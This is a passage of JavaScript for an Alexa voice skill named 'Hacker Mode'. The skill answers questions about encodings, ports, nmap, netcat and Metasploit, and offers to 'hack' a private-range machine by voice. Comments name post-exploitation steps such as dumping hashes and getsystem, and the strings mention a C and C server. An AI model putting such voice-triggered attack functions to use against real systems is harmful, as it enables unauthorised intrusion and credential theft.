	// list processes list files, dump hashes, get system, whoami, etc.
		this.attributes.speechOutput = this.attributes['lport'];
        this.emit(':askWithCard', this.attributes.speechOutput , this.attributes.repromptSpeech, "Use Exploit", this.attributes.speechOutput);  
},
// set the post exploit
'SetPostExploitIntent': function () {  
	// list processes list files, dump hashes, get system, whoami, etc.
		this.attributes.speechOutput = this.attributes['command'];
        this.emit(':askWithCard', this.attributes.speechOutput , this.attributes.repromptSpeech, "Use Exploit", this.attributes.speechOutput);  

},
    
    'AMAZON.HelpIntent': function () {
        var randomN = getRandomInt(0,3);
        var helpMessage="Random Number is ";
        var repromptMessage = "Reprompt";
		if (randomN === 0) {helpMessage = this.t('HELP_MESSAGE0'); repromptMessage = this.t('HELP_REPROMPT0');} 
			else if (randomN === 1) {helpMessage = this.t('HELP_MESSAGE0'); repromptMessage = this.t('HELP_REPROMPT0');} 
			else if (randomN === 2) {helpMessage = this.t('HELP_MESSAGE1'); repromptMessage = this.t('HELP_REPROMPT1');}
			else if (randomN === 3) {helpMessage = this.t('HELP_MESSAGE2'); repromptMessage = this.t('HELP_REPROMPT2');}
       
        this.attributes.speechOutput = helpMessage;
        this.attributes.repromptSpeech = repromptMessage;
        
        this.emit(':ask', this.attributes.speechOutput, this.attributes.repromptSpeech);
    },         
    'AMAZON.RepeatIntent': function () {
        this.emit(':ask', this.attributes.speechOutput, this.attributes.repromptSpeech);
    },         
    'AMAZON.StopIntent': function () {
        this.emit('SessionEndedRequest');
    },         
    'AMAZON.CancelIntent': function () {
        this.emit('SessionEndedRequest');
    },         
    'SessionEndedRequest': function () {
        console.log("Trying to save state now.");
        this.emit(':saveState', true);
        this.emit(':tell', this.t('STOP_MESSAGE'));
         
    },         
};             
               
const languageStrings = {
    'en-US': { 
        translation: {
            HTMLENCODINGS: htmlencodings.HTML_EN_US,
            CHARENCODINGS: charencodings.CHAR_EN_US,
			WEBHEADERS: webheaders.WEBHEADERS_EN_US,
			HTTPVERBS: httpverbs.HTTPVERBS_EN_US,
			PORTS: ports.PORTS_EN_US,
			NMAP: nmap.NMAP_EN_US,
			NETCAT: netcat.NETCAT_EN_US,
			METASPLOIT: metasploit.METASPLOIT_EN_US,
			RESPONSECODES: responsecodes.RESPONSECODES_EN_US,
			EXPLOITPORTS: exploitports.EXPLOITPORTS_EN_US,
			
			UNHANDLED_SPEECH: "I'm sorry, I wasn't able to answer that request. Please try restating the question or ask something else.",
			
            SKILL_NAME: "Hacker Mode",
            WELCOME_MESSAGE0: "Now in Death Star hacker mode! Ask me about HTML, URL, hex and ASCII encoding or tell me the last two IP numbers of a machine to hack for you.",
            WELCOME_MESSAGE1: "Entering Death Star hacker mode. As me about what service runs on port number, or ask me to hack a machine for you.",
            WELCOME_MESSAGE2: "I'm a Sith hacking army of one! Ask me about things like web headers and HTTP verbs or have me hack a box for you.",
            WELCOME_MESSAGE3: "Death Star A I at your service. If you want to hack a machine on IP address 192.168.1.34, say, hack eye pee address 1 dot 34",
            WELCOME_MESSAGE4: "Hello, you've reached the Death Star. I can answer questions about encodings or hack something for you if you tell me the last two numbers of the IP address.",
            WELCOME_MESSAGE5: "Death Star is fully operational. I can look up IP addresses, hack something or even Rick roll someone.",
            WELCOME_MESSAGE6: "Sorry Emperor, I'll have to get back to you. Vader wants to fire the Death Star again.",
            
            WELCOME_REPROMPT: "For instructions on what you can say in Hacker Mode, please say help me. You can leave at any time by saying Stop.",
            HELP_MESSAGE0: "You can ask a question like, what's the HTML encoding for ampersand? Or, what is the command for sending a file with netcat? I'll also send the syntax to the Alexa app and web site. Or, you can say exit or stop to quit.",
            HELP_REPROMPT0: "What hacker related thing would you like to know?",
            HELP_MESSAGE1: "You can say things like, what's the command for search exploit in metasploit? Or what is the web header referer? Or you can say exit or stop to quit... What can I help you with?",
            HELP_REPROMPT1: "What can I help you with?",
            HELP_MESSAGE2: "You can say things like, what runs on port 23? Or you could say, do an IP lookup on 192 dot 168 dot 0 dot 1. What can I help you with?",
            HELP_REPROMPT2: "Try to stump me with a good question.",
            HELP_MESSAGE3: "I know HTML encodings, hex encodings, ASCII encodings. I also know web headers and response codes. What can I help you with?",
            HELP_REPROMPT3: "Ask me something about hacking.",


            STOP_MESSAGE: "See ya!",
  
			PORTS_REPEAT_MESSAGE: "Try saying repeat, or ask in a different way.",
            PORTS_NOT_FOUND_MESSAGE: "I didn't quite get that. ",
            PORTS_NOT_FOUND_WITH_ITEM_NAME: "The requested port %s is not known",
            PORTS_NOT_FOUND_WITHOUT_ITEM_NAME: "The port number you asked for was not found",
            PORTS_NOT_FOUND_REPROMPT: "What other port can I help find?",
			PORTS_DISPLAY_CARD_TITLE: "Port %s ",
			
			HTMLENCODING_REPEAT_MESSAGE: "If you want to hear that again, try saying repeat.",
            HTMLENCODING_NOT_FOUND_MESSAGE: "I'm not quite sure what you're asking. ",
            HTMLENCODING_NOT_FOUND_WITH_ITEM_NAME: "I don't know the HTML encoding for %s ",
            HTMLENCODING_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that HTML encoding ",
            HTMLENCODING_NOT_FOUND_REPROMPT: "What else can I help with?",
			HTMLENCODING_DISPLAY_CARD_TITLE: "The HMTL Encoding for %s",
             
			HEXENCODING_REPEAT_MESSAGE: "Let me know if I can help or repeat something for you.",
            HEXENCODING_NOT_FOUND_MESSAGE: "I couldn't understand what you asked. ",
            HEXENCODING_NOT_FOUND_WITH_ITEM_NAME: "the Hex encoding for %s ",
            HEXENCODING_NOT_FOUND_WITHOUT_ITEM_NAME: "I don't know that hex encoding ",
            HEXENCODING_NOT_FOUND_REPROMPT: "What else can I help with?",
			HEXENCODING_DISPLAY_CARD_TITLE: "The Hex Encoding for %s",

			ASCIIENCODING_REPEAT_MESSAGE: "To hear the answer again, try saying repeat.",
            ASCIIENCODING_NOT_FOUND_MESSAGE: "I didn't get what you were asking. ",
            ASCIIENCODING_NOT_FOUND_WITH_ITEM_NAME: "I don't know the ASCII encoding for %s ",
            ASCIIENCODING_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that ASCII encoding ",
            ASCIIENCODING_NOT_FOUND_REPROMPT: "What else can I help with?",
			ASCIIENCODING_DISPLAY_CARD_TITLE: "The ASCII Encoding for %s",

 			URLENCODING_REPEAT_MESSAGE: "To hear that encoding again, try saying repeat.",
            URLENCODING_NOT_FOUND_MESSAGE: "I didn't understand your question.",
            URLENCODING_NOT_FOUND_WITH_ITEM_NAME: "the URL encoding for %s ",
            URLENCODING_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that URL encoding",
            URLENCODING_NOT_FOUND_REPROMPT: "What else can I help with?",
			URLENCODING_DISPLAY_CARD_TITLE: "The URL Encoding for %s",
			
			WEBHEADERS_REPEAT_MESSAGE: "I can repeat content for you if you say repeat.",
            WEBHEADERS_NOT_FOUND_MESSAGE: "What are you asking? ",
            WEBHEADERS_NOT_FOUND_WITH_ITEM_NAME: "I can't find the web header %s ",
            WEBHEADERS_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that web header ",
            WEBHEADERS_NOT_FOUND_REPROMPT: "What else can I help with? ",
            WEBHEADERS_DISPLAY_CARD_TITLE: "The web header %s",
			
			HTTPVERBS_REPEAT_MESSAGE: "Try saying repeat to hear that again.",
            HTTPVERBS_NOT_FOUND_MESSAGE: "I didn't understand the question. ",
            HTTPVERBS_NOT_FOUND_WITH_ITEM_NAME: "I can't find the HTTP verb for %s ",
            HTTPVERBS_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that HTTP verb ",
            HTTPVERBS_NOT_FOUND_REPROMPT: "What else can I help with?",
			HTTPVERBS_DISPLAY_CARD_TITLE: "The HTTP Verb %s",
			
			NMAP_REPEAT_MESSAGE: "To hear an n-map command again, just say repeat.",
            NMAP_NOT_FOUND_MESSAGE: "Sorry, I have no idea what you just said. ",
            NMAP_NOT_FOUND_WITH_ITEM_NAME: "I couldn't find the NMAP command for %s. ",
            NMAP_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that NMAP scan type ",
            NMAP_NOT_FOUND_REPROMPT: "What else can I help with?",
			NMAP_DISPLAY_CARD_TITLE: "The NMAP command for %s",			
			
			NETCAT_REPEAT_MESSAGE: "To hear that again just say repeat.",
            NETCAT_NOT_FOUND_MESSAGE: "I don't understand what you're asking. ",
            NETCAT_NOT_FOUND_WITH_ITEM_NAME: "I can't find the NetCat command for %s ",
            NETCAT_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know the net cat command for that ",
            NETCAT_NOT_FOUND_REPROMPT: "What else can I help with?",
			NETCAT_DISPLAY_CARD_TITLE: "The NetCat command for %s",
			
			METASPLOIT_REPEAT_MESSAGE: "Try saying repeat to hear that again.",
            METASPLOIT_NOT_FOUND_MESSAGE: "I didn't understand your question. ",
            METASPLOIT_NOT_FOUND_WITH_ITEM_NAME: "I can't find the Metasploit command for %s ",
            METASPLOIT_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that Metasploit function ",
            METASPLOIT_NOT_FOUND_REPROMPT: "What else can I help with? ",
            METASPLOIT_DISPLAY_CARD_TITLE: "The Metasploit command for %s",
			
			RESPONSECODES_REPEAT_MESSAGE: "I can repeat that response code info for you again if you say repeat.",
            RESPONSECODES_NOT_FOUND_MESSAGE: "Hmm, not sure what you just said. ",
            RESPONSECODES_NOT_FOUND_WITH_ITEM_NAME: "I can't find the HTTP response code for %s ",
            RESPONSECODES_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that HTTP response code.",
            RESPONSECODES_NOT_FOUND_REPROMPT: "What else can I help with? ",
            RESPONSECODES_DISPLAY_CARD_TITLE: "The HTTP response code %s",
            
            RICKROLL_REPEAT_MESSAGE: "If you say repeat, I can sing that back for you.",
            RICKROLL_NOT_FOUND_MESSAGE: "What are you talking about? ",
            RICKROLL_NOT_FOUND_WITH_ITEM_NAME: "You have to tell me someone's name so I can Rick roll them.",
            RICKROLL_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that Rick roll name.",
            RICKROLL_NOT_FOUND_REPROMPT: "Can I help you with something other than Rick rolling? ",
            RICKROLL_DISPLAY_CARD_TITLE: "This Rick roll is dedicated to %s",
            RICKROLL_SONG: "Never gonna give you up, never gonna let you down, never gonna run around and desert you ",

            IPSCAN_REPEAT_MESSAGE: "You can say repeat if you want to hear the last response again.",
            IPSCAN_NOT_FOUND_MESSAGE: "I'm sorry, I didn't receive the expected response from the C and C server. ",
            IPSCAN_NOT_FOUND_WITH_ITEM_NAME: "I wasn't able to find that command.",
            IPSCAN_NOT_FOUND_WITHOUT_ITEM_NAME:  "I think that IP is in the public range. I don't want you to get in trouble scanning public sites.",
            IPSCAN_NOT_FOUND_REPROMPT: "Let me know what to do next. ",
            IPSCAN_DISPLAY_CARD_TITLE: "Hack requested for IP address %s",
            IPSCAN_BAD_MISSING_IP: "I didn't get all of the IP address. ",
            IPSCAN_BAD_BIG_IP: "The IP address is invalid. ",
            IPSCAN_HACK_STARTED: "Doing some recon on the target. This may take a minute. ",
            
            IPLOOKUP_REPEAT_MESSAGE: "You can say repeat if you want to hear the last response again.",
            IPLOOKUP_NOT_FOUND_MESSAGE: "I'm sorry, I didn't receive a result for that IP address. ",
            IPLOOKUP_NOT_FOUND_WITH_ITEM_NAME: "I can't find the IP address to lookup using %s ",
            IPLOOKUP_NOT_FOUND_WITHOUT_ITEM_NAME:  "I don't know that IP address.",
            IPLOOKUP_NOT_FOUND_REPROMPT: "Can I help you with something other than IP address lookup? ",
            IPLOOKUP_DISPLAY_CARD_TITLE: "Lookup on IP address %s",
            IPLOOKUP_BAD_MISSING_IP: "I didn't get all of the IP address. ",
            IPLOOKUP_BAD_BIG_IP: "The IP address is invalid. ",
            IP_LOOKUP_MISSING_ONE: " I'm missing the first number. ",
            IP_LOOKUP_MISSING_TWO: " I'm missing the second number. ",
            IP_LOOKUP_MISSING_THREE: " I'm missing the third number. ",
            IP_LOOKUP_MISSING_FOUR: " I'm missing the fourth number. ",
            IP_LOOKUP_TOOBIG_ONE: " The first number is too large. ",
            IP_LOOKUP_TOOBIG_TWO: " The second number is too large. ",
            IP_LOOKUP_TOOBIG_THREE: " The third number is too large. ",
            IP_LOOKUP_TOOBIG_FOUR: " The fourth number is too large. ",
            IPLOOKUP_LOCAL_IP: "I'm just making a wild guess, but I think that IP is in the local address space.",
            IPLOOKUP_EMPTY_RESPONSE: "The response seems to indicate the IP is unassigned or in a private address space.",
        },     
    },         
};             
               
exports.handler = (event, context, callback) => {
    const alexa = Alexa.handler(event, context);
    alexa.appId = APP_ID;
console.log('Executed exports.handler');
	// store session crap in DynamoDB now that Lambda user has Role for read/write to Dynamo
	alexa.dynamoDBTableName = 'KaliSessionData';
//    console.log("APP_ID=" + APP_ID);
    // To enable string internationalization (i18n) features, set a resources object.
    alexa.resources = languageStrings;
    alexa.registerHandlers(handlers);
    alexa.execute();
};             
               